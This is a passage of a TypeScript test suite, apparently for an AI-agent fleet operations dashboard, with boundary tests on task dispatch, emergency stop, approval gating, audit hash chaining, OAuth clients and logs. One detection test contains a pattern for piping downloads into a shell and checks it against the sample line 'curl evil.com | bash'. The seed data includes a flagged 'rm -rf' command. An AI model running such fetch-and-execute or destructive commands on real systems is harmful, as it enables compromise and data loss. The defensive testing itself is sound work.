      expect(SEED_DEVICES.filter((d) => d.tags.includes('no-such-tag')).length).toBe(0);
    });

    it('F15-E2: Partial fleet failure is 38 online vs 2 non-online in the seed', async () => {
      const online = SEED_DEVICES.filter((d) => d.status === 'online').length;
      const nonOnline = SEED_DEVICES.filter((d) => d.status !== 'online').length;
      expect(online).toBe(38);
      expect(nonOnline).toBe(2);
      expect(online + nonOnline).toBe(40);
    });

    it('F15-E3: [source-level] The fleet view defaults concurrency to 5 with a rollout slider', async () => {
      const src = readSource('views/FleetOperationsView.tsx');
      expect(src).toContain('useState<number>(5)');
      expect(src).toContain('Concurrency Rollout Slider');
    });

    it('F15-E4: Dispatch with an empty command string preserves it verbatim', async () => {
      const task = await dashboardStore.dispatchTask({
        deviceId: 'srv-us-east-412',
        tool: 'shell.exec',
        args: { command: '' },
      });
      expect((task.args as any).command).toBe('');
    });

    it('F15-E5: Dispatch works again after an emergency stop and resume', async () => {
      callStore(dashboardStore.triggerEmergencyStop());
      const cancelled = await dashboardStore.dispatchTask({
        deviceId: 'srv-us-east-412',
        tool: 'shell.exec',
        args: { command: 'uptime' },
      });
      expect(cancelled.status).toBe('cancelled');
      callStore(dashboardStore.resumeFleet());
      expect(dashboardStore.getState().isEmergencyStopActive).toBe(false);
      const running = await dashboardStore.dispatchTask({
        deviceId: 'srv-us-east-412',
        tool: 'shell.exec',
        args: { command: 'uptime' },
      });
      expect(running.status).toBe('running');
    });
  }, { tier: 'tier2', featureId: 'F15' });

  // =========================================================================
  // F16: Reactive Self-Healing Rule Cards (5 edge tests)
  // =========================================================================
  describe('F16: Reactive Self-Healing Rule Cards (Boundary Cases)', () => {
    it('F16-E1: The auto-heal daemon appears exactly once in the seed audit', async () => {
      expect(SEED_AUDIT_EVENTS.filter((e) => e.actor === 'workflow:auto-heal-daemon').length).toBe(1);
      expect(SEED_AUDIT_EVENTS.filter((e) => e.action === 'systemd.restart_service').length).toBe(1);
    });

    it('F16-E2: CPU percentages stay inside 0–100 for every seed device', async () => {
      for (const d of SEED_DEVICES) {
        expect(d.telemetry.cpuPercent).toBeGreaterThanOrEqual(0);
        expect(d.telemetry.cpuPercent).toBeLessThanOrEqual(100);
      }
    });

    it('F16-E3: A blocked remediation is recorded as a denied audit event', async () => {
      const denied = SEED_AUDIT_EVENTS.filter((e) => e.governanceVerdict === 'denied');
      expect(denied.length).toBe(1);
      expect(denied[0].payloadSummary).toContain('Policy POL-042');
    });

    it('F16-E4: Turning the poll switch off does not gate task dispatch', async () => {
      // An earlier test's sync prefix left the emergency stop active; its
      // resume only runs in a later continuation, so clear it here first.
      callStore(dashboardStore.resumeFleet());
      dashboardStore.setAutoPollEnabled(false);
      const task = await dashboardStore.dispatchTask({
        deviceId: 'srv-us-east-412',
        tool: 'shell.exec',
        args: { command: 'systemctl status ai-bridge-agent' },
      });
      expect(task.status).toBe('running');
      dashboardStore.setAutoPollEnabled(true);
      expect(dashboardStore.getState().autoPollEnabled).toBe(true);
    });

    it('F16-E5: The seed remediation action starts with systemctl', async () => {
      const src = readSource('views/FleetOperationsView.tsx');
      expect(src).toContain('systemctl restart ai-bridge-agent && notify SecOps');
      const action = 'systemctl restart ai-bridge-agent && notify SecOps';
      expect(action.startsWith('systemctl')).toBe(true);
    });
  }, { tier: 'tier2', featureId: 'F16' });

  // =========================================================================
  // F17: Multi-Provider Agent Hub (5 edge tests)
  // =========================================================================
  describe('F17: Multi-Provider Agent Hub (Boundary Cases)', () => {
    it('F17-E1: [source-level] Four provider descriptors exist; only Ollama needs no key', async () => {
      const src = readSource('views/AiApiHubView.tsx');
      for (const id of ['anthropic', 'openai', 'gemini', 'ollama']) {
        expect(src).toContain(`id: "${id}"`);
      }
      expect(src).toContain('keyMasked: d.id === "ollama" ? "No key required — local endpoint" : null');
    });

    it('F17-E2: [source-level, honesty D-03] Cards show "Not configured"; masked keys come only from the backend', async () => {
      const src = readSource('views/AiApiHubView.tsx');
      expect(src).toContain('"Not configured"');
      expect(src).toContain('settings.masked_keys');
      expect(src).not.toContain('sk-ant-api03-***9a4');
      expect(src).not.toContain('sk-proj-***410f');
      expect(src).not.toContain('AIzaSy***71b9');
    });

    it('F17-E3: [source-level] Provider ping tracks an in-flight flag and a measured latency', async () => {
      const src = readSource('views/AiApiHubView.tsx');
      expect(src).toContain('isPinging');
      expect(src).toContain('latencyMs: measuredMs');
    });

    it('F17-E4: [source-level] Ollama defaults to the local endpoint when no URL is configured', async () => {
      const src = readSource('views/AiApiHubView.tsx');
      expect(src).toContain('http://localhost:11434/v1');
    });

    it('F17-E5: [source-level] The SDK snippet is built from a gateway_url template', async () => {
      const src = readSource('views/AiApiHubView.tsx');
      expect(src).toContain('gateway_url=');
      expect(src).toContain('BridgeClient');
    });
  }, { tier: 'tier2', featureId: 'F17' });

  // =========================================================================
  // F18: Human-in-the-Loop Approval Modal (5 edge tests)
  // =========================================================================
  describe('F18: Human-in-the-Loop Approval Modal (Boundary Cases)', () => {
    it('F18-E1: Seed approval SLAs are live: requested recently, expiring in the future', async () => {
      for (const a of SEED_APPROVALS) {
        expect(Date.parse(a.expiresAt)).toBeGreaterThan(Date.parse(a.requestedAt));
        expect(Date.parse(a.expiresAt)).toBeGreaterThan(Date.now());
        expect(Date.now() - Date.parse(a.requestedAt)).toBeLessThan(10 * 60 * 1000);
      }
    });

    it('F18-E2: Denying a nonexistent approval is a no-op (no audit event appended)', async () => {
      const before = dashboardStore.getState();
      const p = dashboardStore.resolveApproval('APR-DOES-NOT-EXIST', 'denied', '');
      callStore(p);
      const after = dashboardStore.getState();
      expect(after.approvals.length).toBe(before.approvals.length);
      expect(after.auditEvents.length).toBe(before.auditEvents.length);
      await p;
    });

    it('F18-E3: Every seed approval carries a non-empty reason and requester', async () => {
      for (const a of SEED_APPROVALS) {
        expect(a.reason.length).toBeGreaterThan(0);
        expect(a.requester.length).toBeGreaterThan(0);
        expect(a.command.length).toBeGreaterThan(0);
      }
    });

    it('F18-E4: No seed approval was requested by the operator (dual-custody: agents/workflows only)', async () => {
      for (const a of SEED_APPROVALS) {
        expect(a.requester.startsWith('agent:') || a.requester.startsWith('workflow:')).toBe(true);
        expect(a.requester).not.toBe('operator:sarah.j');
      }
    });

    it('F18-E5: Approving a nonexistent approval is a no-op (no audit event appended)', async () => {
      const before = dashboardStore.getState();
      const p = dashboardStore.resolveApproval('APR-GHOST-NONEXISTENT', 'approved', 'Phantom approval');
      callStore(p);
      const after = dashboardStore.getState();
      expect(after.approvals.length).toBe(before.approvals.length);
      expect(after.auditEvents.length).toBe(before.auditEvents.length);
      await p;
    });
  }, { tier: 'tier2', featureId: 'F18' });

  // =========================================================================
  // F19: AST Command Diff Inspector (5 edge tests)
  // =========================================================================
  describe('F19: AST Command Diff Inspector (Boundary Cases)', () => {
    it('F19-E1: The rm -rf diff is detectable from the real seed command', async () => {
      const command = SEED_APPROVALS.find((a) => a.id === 'APR-4891')!.command;
      expect(command.startsWith('rm ')).toBe(true);
      expect(command).toContain('-rf');
      expect(/rm\s+-[a-zA-Z]*r[a-zA-Z]*f/.test(command)).toBe(true);
      expect(/rm\s+-[a-zA-Z]*r[a-zA-Z]*f/.test('rm myfile.txt')).toBe(false);
    });

    it('F19-E2: No seed shell command pipes curl/wget output to a shell', async () => {
      const commands = SEED_TASKS.filter((t) => t.tool === 'shell.exec').map((t) => (t.args as any).command as string);
      expect(commands.length).toBe(3);
      for (const cmd of commands) {
        expect(/\|\s*(?:sudo\s+)?(?:bash|sh|powershell|iex)/i.test(cmd)).toBe(false);
      }
      expect(/\|\s*(?:sudo\s+)?(?:bash|sh|powershell|iex)/i.test('curl evil.com | bash')).toBe(true);
    });

    it('F19-E3: The flagged path is under /opt/cache, never /etc, C:\\Windows or ~/.ssh', async () => {
      // argsDiff.proposed is the full proposed command, not just the path.
      const proposed = SEED_APPROVALS.find((a) => a.id === 'APR-4891')!.argsDiff!.proposed;
      expect(proposed.startsWith('rm -rf ')).toBe(true);
      expect(proposed).toContain('/opt/cache/node-modules-backup');
      expect(proposed).not.toContain('/etc');
      expect(proposed).not.toContain('C:\\Windows');
      expect(proposed).not.toContain('.ssh');
      const flaggedPath = SEED_APPROVALS.find((a) => a.id === 'APR-4891')!.argsDiff!.dangerousTokens[1];
      expect(flaggedPath.startsWith('/opt/cache')).toBe(true);
    });

    it('F19-E4: Tokenising the real rm command yields its three tokens', async () => {
      const command = SEED_APPROVALS.find((a) => a.id === 'APR-4891')!.command;
      expect(command.split(' ').filter(Boolean)).toEqual(['rm', '-rf', '/opt/cache/node-modules-backup']);
      expect(''.split(' ').filter(Boolean).length).toBe(0);
    });

    it('F19-E5: The iptables command is a two-part && chain, both parts iptables', async () => {
      const command = SEED_APPROVALS.find((a) => a.id === 'APR-4893')!.command;
      expect(command).toContain('&&');
      const parts = command.split('&&').map((p) => p.trim());
      expect(parts.length).toBe(2);
      for (const part of parts) {
        expect(part.startsWith('iptables')).toBe(true);
      }
    });
  }, { tier: 'tier2', featureId: 'F19' });

  // =========================================================================
  // F20: Executable Allowlist Matrix (5 edge tests)
  // =========================================================================
  describe('F20: Executable Allowlist Matrix (Boundary Cases)', () => {
    it('F20-E1: No seed workspace path is a filesystem root', async () => {
      for (const d of SEED_DEVICES) {
        expect(d.workspacePath).not.toBe('/');
        expect(d.workspacePath).not.toBe('C:\\');
        expect(d.workspacePath.length).toBeGreaterThan(1);
      }
    });

    it('F20-E2: A dispatched task appends a well-formed sha256: audit hash', async () => {
      const before = dashboardStore.getState().auditEvents.length;
      const pending = dashboardStore.dispatchTask({
        deviceId: 'srv-us-east-412',
        tool: 'desktop.capture_screen',
        args: {},
      });
      const after = dashboardStore.getState();
      expect(after.auditEvents.length).toBe(before + 1);
      expect(after.auditEvents[0].sha256Hash).toMatch(/^sha256:[0-9a-f]{64}$/);
      await pending;
    });

    it('F20-E3: Production-east and production-west tags never overlap on one device', async () => {
      const east = new Set(SEED_DEVICES.filter((d) => d.tags.includes('production-east')).map((d) => d.id));
      const west = new Set(SEED_DEVICES.filter((d) => d.tags.includes('production-west')).map((d) => d.id));
      const overlap = [...east].filter((id) => west.has(id));
      expect(overlap.length).toBe(0);
    });

    it('F20-E4: Exported MCP schemas are unique within each stream', async () => {
      for (const c of SEED_MCP_CONNECTIONS) {
        expect(new Set(c.exportedSchemas).size).toBe(c.exportedSchemas.length);
        expect(c.exportedSchemas.length).toBeGreaterThanOrEqual(3);
      }
    });

    it('F20-E5: dispatchTask replaces state immutably (the previous snapshot is untouched)', async () => {
      const oldState = dashboardStore.getState();
      const oldTaskCount = oldState.tasks.length;
      const pending = dashboardStore.dispatchTask({
        deviceId: 'srv-us-east-412',
        tool: 'desktop.capture_screen',
        args: {},
      });
      const newState = dashboardStore.getState();
      expect(newState).not.toBe(oldState);
      expect(oldState.tasks.length).toBe(oldTaskCount);
      expect(newState.tasks.length).toBe(oldTaskCount + 1);
      await pending;
    });
  }, { tier: 'tier2', featureId: 'F20' });

  // =========================================================================
  // F21: Webhook Dispatcher Suite (5 edge tests)
  // =========================================================================
  describe('F21: Webhook Dispatcher Suite (Boundary Cases)', () => {
    it('F21-E1: [source-level] The policies view tests the webhook through api.testWebhook()', async () => {
      const src = readSource('views/SecurityPoliciesView.tsx');
      expect(src).toContain('api.testWebhook()');
      expect(typeof api.setWebhook).toBe('function');
      expect(typeof api.getWebhook).toBe('function');
    });

    it('F21-E2: All three demo webhook deliveries report HTTP 200', async () => {
      const src = readSource('views/SecurityPoliciesDemo.tsx');
      for (const id of ['del-01', 'del-02', 'del-03']) {
        expect(src).toContain(`id: "${id}"`);
      }
      const delivered = (src.match(/delivered \(200 OK\)/g) || []).length;
      expect(delivered).toBe(3);
    });

    it('F21-E3: No seed OAuth client is revoked', async () => {
      expect(SEED_OAUTH_CLIENTS.filter((c) => c.status === 'revoked').length).toBe(0);
      expect(SEED_OAUTH_CLIENTS.filter((c) => c.status === 'expired').length).toBe(0);
      expect(SEED_OAUTH_CLIENTS.filter((c) => c.status === 'active').length).toBe(3);
    });

    it('F21-E4: [source-level] The api client aborts stalled calls after 15s', async () => {
      const src = readSource('api.ts');
      expect(src).toContain('AbortSignal.timeout(15000)');
    });

    it('F21-E5: [source-level] Alert deliveries are fetched through api.alertDeliveries()', async () => {
      expect(typeof api.alertDeliveries).toBe('function');
      expect(typeof api.testAlerts).toBe('function');
    });
  }, { tier: 'tier2', featureId: 'F21' });

  // =========================================================================
  // F22: Merkle Root Integrity Ledger (5 edge tests)
  // =========================================================================
  describe('F22: Merkle Root Integrity Ledger (Boundary Cases)', () => {
    it('F22-E1: The chain check discriminates: it passes on the real seed and fails on a tampered copy', async () => {
      const chainHolds = (events: typeof SEED_AUDIT_EVENTS): boolean => {
        for (let i = 0; i < events.length - 1; i++) {
          if (events[i].prevHash !== events[i + 1].sha256Hash) return false;
        }
        return true;
      };
      expect(chainHolds(SEED_AUDIT_EVENTS)).toBe(true);
      const tampered = SEED_AUDIT_EVENTS.map((e, i) =>
        i === 1 ? { ...e, sha256Hash: '0'.repeat(64) } : e
      );
      expect(chainHolds(tampered)).toBe(false);
    });

    it('F22-E2: A broken prevHash link is detected on a tampered copy', async () => {
      const chainHolds = (events: typeof SEED_AUDIT_EVENTS): boolean => {
        for (let i = 0; i < events.length - 1; i++) {
          if (events[i].prevHash !== events[i + 1].sha256Hash) return false;
        }
        return true;
      };
      const tampered = SEED_AUDIT_EVENTS.map((e, i) =>
        i === 0 ? { ...e, prevHash: 'f'.repeat(64) } : e
      );
      expect(chainHolds(tampered)).toBe(false);
      expect(chainHolds(SEED_AUDIT_EVENTS)).toBe(true);
    });

    it('F22-E3: The oldest seed block has a real 64-hex prevHash, not a zeroed genesis hash', async () => {
      const oldest = SEED_AUDIT_EVENTS[SEED_AUDIT_EVENTS.length - 1];
      expect(oldest.blockNumber).toBe(1492016);
      expect(oldest.prevHash).toMatch(/^[0-9a-f]{64}$/);
      expect(oldest.prevHash).not.toBe('0'.repeat(64));
    });

    it('F22-E4: No seed audit event carries the flagged verdict', async () => {
      expect(SEED_AUDIT_EVENTS.filter((e) => e.governanceVerdict === 'flagged').length).toBe(0);
    });

    it('F22-E5: The seed ledger is newest-first, so a start-after-end range is inverted', async () => {
      const first = Date.parse(SEED_AUDIT_EVENTS[0].timestamp);
      const last = Date.parse(SEED_AUDIT_EVENTS[SEED_AUDIT_EVENTS.length - 1].timestamp);
      expect(first).toBeGreaterThan(last);
      const isValidRange = (start: number, end: number) => start <= end;
      expect(isValidRange(last, first)).toBe(true);
      expect(isValidRange(first, last)).toBe(false);
    });
  }, { tier: 'tier2', featureId: 'F22' });

  // =========================================================================
  // F23: Multi-Format Audit Exporter (5 edge tests)
  // =========================================================================
  describe('F23: Multi-Format Audit Exporter (Boundary Cases)', () => {
    it('F23-E1: An audit record survives a JSON round-trip (commas and quotes included)', async () => {
      const record = SEED_AUDIT_EVENTS[0];
      expect(JSON.parse(JSON.stringify(record))).toEqual(record);
      expect(typeof record.payloadSummary).toBe('string');
    });

    it('F23-E2: Exporting the operator-only slice yields exactly one record', async () => {
      expect(SEED_AUDIT_EVENTS.filter((e) => e.actor === 'operator:sarah.j').length).toBe(1);
      expect(SEED_AUDIT_EVENTS.filter((e) => e.actor === 'agent:gpt-4o-copilot').length).toBe(1);
    });

    it('F23-E3: Chunking the 4-record seed into pairs yields two chunks', async () => {
      const chunks: typeof SEED_AUDIT_EVENTS[] = [];
      for (let i = 0; i < SEED_AUDIT_EVENTS.length; i += 2) {
        chunks.push(SEED_AUDIT_EVENTS.slice(i, i + 2));
      }
      expect(chunks.length).toBe(2);
      expect(chunks[0].length).toBe(2);
      expect(chunks[1].length).toBe(2);
    });

    it('F23-E4: The demo audit "hash" is a hex-padded timestamp, not a digest', async () => {
      const before = Date.now();
      const pending = dashboardStore.dispatchTask({
        deviceId: 'srv-us-east-412',
        tool: 'desktop.capture_screen',
        args: {},
      });
      const head = dashboardStore.getState().auditEvents[0];
      expect(head.sha256Hash).toMatch(/^sha256:[0-9a-f]{64}$/);
      const embeddedMs = Number.parseInt(head.sha256Hash.slice('sha256:'.length), 16);
      expect(Math.abs(embeddedMs - before)).toBeLessThan(60 * 1000);
      await pending;
    });

    it('F23-E5: [source-level] Export supports csv/jsonld/jsonl and no other format', async () => {
      const src = readSource('views/AuditTrailView.tsx');
      expect(src).toContain('format: "csv" | "jsonld" | "jsonl"');
      expect(src).not.toContain('"docx"');
    });
  }, { tier: 'tier2', featureId: 'F23' });

  // =========================================================================
  // F24: MCP Protocol Gateway Monitor (5 edge tests)
  // =========================================================================
  describe('F24: MCP Protocol Gateway Monitor (Boundary Cases)', () => {
    it('F24-E1: Every seed stream carries throughput (zero would mean offline)', async () => {
      for (const c of SEED_MCP_CONNECTIONS) {
        expect(c.throughputReqMin).toBeGreaterThan(0);
        expect(c.connectedClients).toBeGreaterThan(0);
      }
    });

    it('F24-E2: Deregistering one stream leaves three in the seed', async () => {
      const remaining = SEED_MCP_CONNECTIONS.filter((c) => c.id !== 'mcp-stream-02');
      expect(remaining.length).toBe(3);
      expect(remaining.map((c) => c.id)).toEqual(['mcp-stream-01', 'mcp-stream-03', 'mcp-stream-04']);
    });

    it('F24-E3: Seed MCP routes are unique (no duplicate registration)', async () => {
      expect(new Set(SEED_MCP_CONNECTIONS.map((c) => c.route)).size).toBe(4);
      expect(new Set(SEED_MCP_CONNECTIONS.map((c) => c.id)).size).toBe(4);
    });

    it('F24-E4: Every seed stream exports at least three tool schemas', async () => {
      for (const c of SEED_MCP_CONNECTIONS) {
        expect(c.exportedSchemas.length).toBeGreaterThanOrEqual(3);
      }
      expect(SEED_MCP_CONNECTIONS.find((c) => c.id === 'mcp-stream-01')!.exportedSchemas.length).toBe(3);
    });

    it('F24-E5: The events stream URL carries no credential query when unauthenticated', async () => {
      expect(api.eventsStreamUrl()).toBe('http://127.0.0.1:8000/api/events/stream');
      expect(api.eventsStreamUrl()).not.toContain('session_token');
      expect(api.eventsStreamUrl()).not.toContain('token=');
    });
  }, { tier: 'tier2', featureId: 'F24' });

  // =========================================================================
  // F25: OAuth 2.0 Credential Vault (5 edge tests)
  // =========================================================================
  describe('F25: OAuth 2.0 Credential Vault (Boundary Cases)', () => {
    it('F25-E1: The Python SDK client holds approvals:write without approvals:read', async () => {
      const py = SEED_OAUTH_CLIENTS.find((c) => c.id === 'client-py-092')!;
      expect(py.scopes).toEqual(['audit:read', 'approvals:write']);
      expect(py.scopes).toContain('approvals:write');
      expect(py.scopes).not.toContain('approvals:read');
      expect(SEED_OAUTH_CLIENTS.some((c) => c.scopes.includes('fleet:write'))).toBe(false);
    });

    it('F25-E2: No seed client is dimmed as revoked; all three are active', async () => {
      for (const c of SEED_OAUTH_CLIENTS) {
        expect(c.status).toBe('active');
      }
    });

    it('F25-E3: Every seed client holds at least two scopes', async () => {
      for (const c of SEED_OAUTH_CLIENTS) {
        expect(c.scopes.length).toBeGreaterThanOrEqual(2);
      }
      expect(SEED_OAUTH_CLIENTS.find((c) => c.id === 'client-cur-891')!.scopes.length).toBe(3);
    });

    it('F25-E4: Client credential lifetimes span 181–365 days from the real dates', async () => {
      const dayMs = 24 * 60 * 60 * 1000;
      for (const c of SEED_OAUTH_CLIENTS) {
        const spanDays = Math.round((Date.parse(c.expiresAt) - Date.parse(c.createdAt)) / dayMs);
        expect(spanDays).toBeGreaterThanOrEqual(1);
        expect(spanDays).toBeLessThanOrEqual(366);
      }
      const py = SEED_OAUTH_CLIENTS.find((c) => c.id === 'client-py-092')!;
      expect(Math.round((Date.parse(py.expiresAt) - Date.parse(py.createdAt)) / dayMs)).toBe(181);
    });

    it('F25-E5: Seed client ids match the client id pattern', async () => {
      for (const c of SEED_OAUTH_CLIENTS) {
        expect(c.id).toMatch(/^client-[a-z]+-\d+$/);
      }
    });
  }, { tier: 'tier2', featureId: 'F25' });

  // =========================================================================
  // F26: Wire Protocol Realtime Audit Drawer (5 edge tests)
  // =========================================================================
  describe('F26: Wire Protocol Realtime Audit Drawer (Boundary Cases)', () => {
    it('F26-E1: The wire-log task id cross-references a real seed task', async () => {
      const taskId = (SEED_LOGS.find((l) => l.id === 'log-2')!.details as any).taskId;
      expect(taskId).toBe('TSK-89213');
      expect(SEED_TASKS.some((t) => t.id === taskId)).toBe(true);
    });

    it('F26-E2: Unstarted tasks lack startedAt; running tasks have it but lack completedAt', async () => {
      for (const t of SEED_TASKS.filter((x) => x.status === 'needs_approval')) {
        expect(t.startedAt).toBeUndefined();
        expect(t.completedAt).toBeUndefined();
      }
      const running = SEED_TASKS.find((t) => t.id === 'TSK-89210')!;
      expect(running.startedAt).toBeDefined();
      expect(running.completedAt).toBeUndefined();
      for (const t of SEED_TASKS.filter((x) => x.status === 'completed')) {
        expect(t.startedAt).toBeDefined();
        expect(t.completedAt).toBeDefined();
      }
    });

    it('F26-E3: Seed audit payload summaries are short preview-safe strings', async () => {
      for (const e of SEED_AUDIT_EVENTS) {
        expect(e.payloadSummary.length).toBeGreaterThan(0);
        expect(e.payloadSummary.length).toBeLessThan(1000);
      }
    });

    it('F26-E4: Filtering by the literal "shell.exec" matches exactly the shell tasks (dot is not a wildcard)', async () => {
      const matches = SEED_TASKS.filter((t) => t.tool.includes('shell.exec'));
      expect(matches.length).toBe(3);
      expect(SEED_TASKS.filter((t) => t.tool.includes('shellXexec')).length).toBe(0);
    });

    it('F26-E5: Three rapid dispatches keep the audit chain linked', async () => {
      const p1 = dashboardStore.dispatchTask({ deviceId: 'srv-us-east-412', tool: 'shell.exec', args: { command: 'a' } });
      const p2 = dashboardStore.dispatchTask({ deviceId: 'srv-us-east-412', tool: 'shell.exec', args: { command: 'b' } });
      const p3 = dashboardStore.dispatchTask({ deviceId: 'srv-us-east-412', tool: 'shell.exec', args: { command: 'c' } });
      const events = dashboardStore.getState().auditEvents;
      expect(events[0].prevHash).toBe(events[1].sha256Hash);
      expect(events[1].prevHash).toBe(events[2].sha256Hash);
      expect(events[0].blockNumber).toBe(events[1].blockNumber + 1);
      await Promise.all([p1, p2, p3]);
    });
  }, { tier: 'tier2', featureId: 'F26' });

  // =========================================================================
  // F27: Monospace Systemd Log Canvas (5 edge tests)
  // =========================================================================
  describe('F27: Monospace Systemd Log Canvas (Boundary Cases)', () => {
    it('F27-E1: An invalid regex is catchable (the guard the view relies on)', async () => {
      let isRegexValid = true;
      try {
        new RegExp('[unclosed-bracket');
      } catch {
        isRegexValid = false;
      }
      expect(isRegexValid).toBe(false);
      expect(readSource('views/DiagnosticsLogsView.tsx')).toContain('try {');
    });

    it('F27-E2: [source-level] The FATAL level exists in the LogRecord level union', async () => {
      const src = readSource('types/dashboard.ts');
      expect(src).toContain('"FATAL"');
      expect(SEED_LOGS.filter((l) => l.level === 'FATAL').length).toBe(0);
    });

    it('F27-E3: The newest seed log is log-1 (5s ago)', async () => {
      expect(SEED_LOGS[0].id).toBe('log-1');
      expect(Date.now() - Date.parse(SEED_LOGS[0].timestamp)).toBeLessThan(5 * 60 * 1000);
    });

    it('F27-E4: Store listeners fire on device selection changes', async () => {
      let callCount = 0;
      const unsubscribe = dashboardStore.subscribe(() => {
        callCount++;
      });
      const current = dashboardStore.getState().selectedDeviceId;
      const other = current === 'srv-us-east-412' ? 'srv-win-prod-02' : 'srv-us-east-412';
      dashboardStore.setSelectedDeviceId(other);
      expect(callCount).toBe(1);
      dashboardStore.setSelectedDeviceId(other);
      expect(callCount).toBe(1);
      dashboardStore.setSelectedDeviceId('srv-us-east-412');
      expect(callCount).toBe(2);
      unsubscribe();
    });

    it('F27-E5: Filtering logs by an unknown service yields zero rows', async () => {
      expect(SEED_LOGS.filter((l) => l.service === 'nonexistent.service').length).toBe(0);
      expect(SEED_LOGS.filter((l) => l.level === 'ERROR').length).toBe(0);
    });
  }, { tier: 'tier2', featureId: 'F27' });

  // =========================================================================
  // F28: Structured JSON Log Inspector (5 edge tests)
  // =========================================================================
  describe('F28: Structured JSON Log Inspector (Boundary Cases)', () => {
    it('F28-E1: Log details are flat (all values are primitives)', async () => {
      for (const log of SEED_LOGS) {
        for (const value of Object.values(log.details ?? {})) {
          expect(['string', 'number', 'boolean'].includes(typeof value)).toBe(true);
        }
      }
    });

    it('F28-E2: Details mix strings and numbers across the seed', async () => {
      const log1 = SEED_LOGS.find((l) => l.id === 'log-1')!.details as any;
      expect(typeof log1.cipher).toBe('string');
      expect(typeof log1.latencyMs).toBe('number');
      const log4 = SEED_LOGS.find((l) => l.id === 'log-4')!.details as any;
      expect(typeof log4.ruleId).toBe('string');
      expect(typeof log4.riskTier).toBe('string');
      expect(log4.ruleId).toBe('POL-042');
      // log-4's details carry no pid field (pid lives on the record itself).
      expect('pid' in log4).toBe(false);
    });

    it('F28-E3: A pending seed approval has no decision fields yet', async () => {
      for (const a of SEED_APPROVALS) {
        expect('decidedBy' in a).toBe(false);
        expect('decidedAt' in a).toBe(false);
        expect('decisionReason' in a).toBe(false);
      }
    });

    it('F28-E4: Setting the same device id twice notifies only once', async () => {
      let callCount = 0;
      const unsubscribe = dashboardStore.subscribe(() => {
        callCount++;
      });
      dashboardStore.setSelectedDeviceId('srv-win-prod-02');
      expect(callCount).toBe(1);
      dashboardStore.setSelectedDeviceId('srv-win-prod-02');
      expect(callCount).toBe(1);
      dashboardStore.setSelectedDeviceId('srv-us-east-412');
      expect(callCount).toBe(2);
      unsubscribe();
    });

    it('F28-E5: The copied trace id is exactly the stored value', async () => {
      const copied = SEED_LOGS.find((l) => l.id === 'log-1')!.traceId;
      expect(copied).toBe('trc-890a-112');
    });
  }, { tier: 'tier2', featureId: 'F28' });

  // =========================================================================
  // F29: Stream Pause Hotkey (Spacebar) (5 edge tests)
  // =========================================================================
  describe('F29: Stream Pause Hotkey (Spacebar) (Boundary Cases)', () => {
    it('F29-E1: Search chrome strings come from the real i18n catalog', async () => {
      expect(messages).toContain('Search');
      expect(messages).toContain('Cancel');
      expect(translate('en', 'Search')).toBe('Search');
      expect(translate('en', 'Cancel')).toBe('Cancel');
    });

    it('F29-E2: Palette state survives a task dispatch untouched', async () => {
      dashboardStore.setCommandPaletteOpen(true);
      const pending = dashboardStore.dispatchTask({
        deviceId: 'srv-us-east-412',
        tool: 'desktop.capture_screen',
        args: {},
      });
      // Assert synchronously only: later tests' sync prefixes toggle the
      // palette before this await's continuation drains.
      expect(dashboardStore.getState().commandPaletteOpen).toBe(true);
      callStore(pending);
      dashboardStore.setCommandPaletteOpen(false);
    });

    it('F29-E3: Ten rapid poll toggles end back at enabled', async () => {
      for (let i = 0; i < 10; i++) {
        dashboardStore.setAutoPollEnabled(i % 2 === 1);
      }
      expect(dashboardStore.getState().autoPollEnabled).toBe(true);
    });

    it('F29-E4: Buffered dispatches still land while polling is paused', async () => {
      dashboardStore.setAutoPollEnabled(false);
      const before = dashboardStore.getState().tasks.length;
      const pending = dashboardStore.dispatchTask({
        deviceId: 'srv-us-east-412',
        tool: 'desktop.capture_screen',
        args: {},
      });
      expect(dashboardStore.getState().tasks.length).toBe(before + 1);
      await pending;
      dashboardStore.setAutoPollEnabled(true);
      expect(dashboardStore.getState().autoPollEnabled).toBe(true);
    });

    it('F29-E5: Palette state survives view navigation', async () => {
      dashboardStore.setCommandPaletteOpen(true);
      dashboardStore.setCurrentView('live');
      expect(dashboardStore.getState().commandPaletteOpen).toBe(true);
      dashboardStore.setCurrentView('login');
      expect(dashboardStore.getState().commandPaletteOpen).toBe(true);
      dashboardStore.setCommandPaletteOpen(false);
    });
  }, { tier: 'tier2', featureId: 'F29' });

  // =========================================================================
  // F30: Zero-Drop Ring Buffer Meter (5 edge tests)
  // =========================================================================
  describe('F30: Zero-Drop Ring Buffer Meter (Boundary Cases)', () => {
    it('F30-E1: The offline node sits at 0% disk use (empty-buffer boundary)', async () => {
      const offline = SEED_DEVICES.find((d) => d.status === 'offline')!;
      expect(offline.telemetry.diskUsedGb).toBe(0);
      expect(offline.telemetry.diskPercent).toBe(0);
    });

    it('F30-E2: Online disk percentages stay within 0–44% across the seed', async () => {
      const online = SEED_DEVICES.filter((d) => d.status === 'online');
      const maxPct = Math.max(...online.map((d) => d.telemetry.diskPercent));
      const minPct = Math.min(...online.map((d) => d.telemetry.diskPercent));
      expect(maxPct).toBeLessThanOrEqual(44);
      expect(minPct).toBeGreaterThanOrEqual(0);
    });

    it('F30-E3: The largest single-stream throughput is the telemetry stream at 3200 req/min', async () => {
      const max = SEED_MCP_CONNECTIONS.reduce((a, b) => (a.throughputReqMin >= b.throughputReqMin ? a : b));
      expect(max.id).toBe('mcp-stream-03');
      expect(max.throughputReqMin).toBe(3200);
    });

    it('F30-E4: Completed tasks survive an emergency stop (only running/pending are cancelled)', async () => {
      const completedBefore = dashboardStore.getState().tasks.filter((t) => t.status === 'completed').length;
      expect(completedBefore).toBe(3);
      callStore(dashboardStore.triggerEmergencyStop());
      expect(dashboardStore.getState().tasks.filter((t) => t.status === 'completed').length).toBe(3);
      callStore(dashboardStore.resumeFleet());
      expect(dashboardStore.getState().tasks.filter((t) => t.status === 'completed').length).toBe(3);
    });

    it('F30-E5: Slicing the 4-event ledger at a 100-event cap truncates nothing', async () => {
      expect(SEED_AUDIT_EVENTS.slice(0, 100).length).toBe(4);
      expect(SEED_LOGS.slice(0, 100).length).toBe(4);
    });
  }, { tier: 'tier2', featureId: 'F30' });

  // =========================================================================
  // F31: Legacy CSS & Wrapper Elimination (5 edge tests)
  // =========================================================================
  describe('F31: Legacy CSS & Wrapper Elimination (Boundary Cases)', () => {
    it('F31-E1: [source-level] Zero references to ConfirmDialog in production source', async () => {
      const hits: string[] = [];
      for (const file of scanProductionSources()) {
        if (fs.readFileSync(file, 'utf8').includes('ConfirmDialog')) hits.push(file);
      }
      expect(hits.length).toBe(0);
    });
